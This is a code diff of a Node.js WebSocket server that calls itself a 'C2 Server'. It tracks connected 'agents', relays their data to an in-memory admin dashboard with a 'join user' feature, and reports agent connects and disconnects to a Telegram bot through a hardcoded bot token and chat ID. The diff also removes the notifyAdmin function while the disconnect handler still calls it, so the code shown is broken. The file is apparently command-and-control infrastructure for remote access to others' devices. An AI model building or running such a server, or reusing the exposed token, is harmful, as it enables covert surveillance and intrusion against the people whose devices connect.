@@ -2,8 +2,6 @@ const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
-const path = require('path');
-const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -14,30 +12,11 @@ const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
 
 let clients = {};
-let logBuffer = [];
-const MAX_LOGS = 500;
 
 // --- HELPER FUNCTIONS ---
-function logToFile(msg) {
-    const timestamp = new Date().toISOString();
-    const line = `[${timestamp}] ${msg}`;
-    logBuffer.push(line);
-    if (logBuffer.length > MAX_LOGS) logBuffer.shift();
-    console.log(line);
-    broadcastLogToAdmins(line);
-}
-
 function notifyTelegram(msg) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
-    require('https').get(url, (res) => {}).on('error', (e) => logToFile(`[TG ERROR] ${e.message}`));
-}
-
-function notifyAdmin(id, msg) {
-    wss.clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
-            client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
-        }
-    });
+    require('https').get(url, (res) => {}).on('error', (e) => console.log(`[TG Error] ${e.message}`));
 }
 
 function broadcastToAdmin(sourceId, data) {
@@ -48,19 +27,9 @@ function broadcastToAdmin(sourceId, data) {
     });
 }
 
-function broadcastLogToAdmins(line) {
-    wss.clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
-            client.send(JSON.stringify({ type: 'system_log', message: line }));
-        }
-    });
-}
-
 // --- HTTP ROUTING ---
-app.use(express.static(__dirname)); // Serves index.html/admin.html if present
-
 app.get('/', (req, res) => {
-    // Serve the admin dashboard directly from memory if file isn't found
+    // Serves the Admin Dashboard directly from memory
     const htmlContent = `
 <!DOCTYPE html>
 <html lang="en">
@@ -81,7 +50,6 @@ app.get('/', (req, res) => {
         .log-alert-green { color: #4ade80; }
         .log-alert-red { color: #f87171; }
         .log-alert-blue { color: #60a5fa; }
-        .log-alert-white { color: #e2e8f0; }
         .status-dot { height: 10px; width: 10px; background-color: #4ade80; border-radius: 50%; display: inline-block; margin-right: 5px; }
         .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
     </style>
@@ -139,12 +107,6 @@ app.get('/', (req, res) => {
                     renderUsers();
                 } else if (data.type === 'system_log') {
                     addLog(data.message, 'white');
-                } else {
-                    // Signaling Data (Offer/Answer/Candidate)
-                    if (data.targetId) {
-                        addLog(\`[SIG] Received \${data.type} for \${data.targetId}\`, 'blue');
-                        // In a real app, you'd store this signaling data here to pass to the peer connection later
-                    }
                 }
             } catch (e) { console.error(e); }
         };
@@ -192,8 +154,6 @@ app.get('/', (req, res) => {
 
         function joinUser(id) {
             alert(\`Initiating connection to \${id}...\n(Note: Ensure signaling data is exchanged)\`);
-            // Here you would typically trigger the WebRTC handshake
-            // For now, we just log it
             addLog(\`[ADMIN] Requested join to \${id}\`, 'blue');
         }
     </script>
@@ -204,21 +164,14 @@ app.get('/', (req, res) => {
     res.end(htmlContent);
 });
 
-app.get('/health', (req, res) => {
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('OK');
-});
-
 // --- WEBSOCKET HANDLING ---
 wss.on('connection', (ws, req) => {
     let id = uuidv4().substr(0, 8);
     ws.id = id;
     clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
 
-    logToFile(`[+] Client Connected: ${id}`);
     ws.send(JSON.stringify({ type: 'registered', id: id }));
 
-    // Heartbeat
     let pingInterval = setInterval(() => {
         if (ws.readyState === WebSocket.OPEN) {
             ws.ping();
@@ -230,11 +183,9 @@ wss.on('connection', (ws, req) => {
     ws.on('message', (msgRaw) => {
         try {
             const data = JSON.parse(msgRaw);
-            logToFile(`[MSG] Received from ${id}: ${data.type}`);
-
+            
             if (data.type === 'register_admin') {
                 clients[id].isAdmin = true;
-                logToFile(`[ADMIN] Connected with ID: ${id}`);
                 return;
             }
 
@@ -264,20 +215,17 @@ wss.on('connection', (ws, req) => {
                 }
                 broadcastToAdmin(id, data);
             }
-        } catch (e) {
-            logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
-        }
+        } catch (e) {}
     });
 
     ws.on('close', () => {
         delete clients[id];
         notifyAdmin(id, '🔴 User Disconnected');
         notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
-        logToFile(`[-] Client Disconnected: ${id}`);
     });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    logToFile(`C2 Server running on port ${PORT}`);
+    console.log(`C2 Server running on port ${PORT}`);
 });
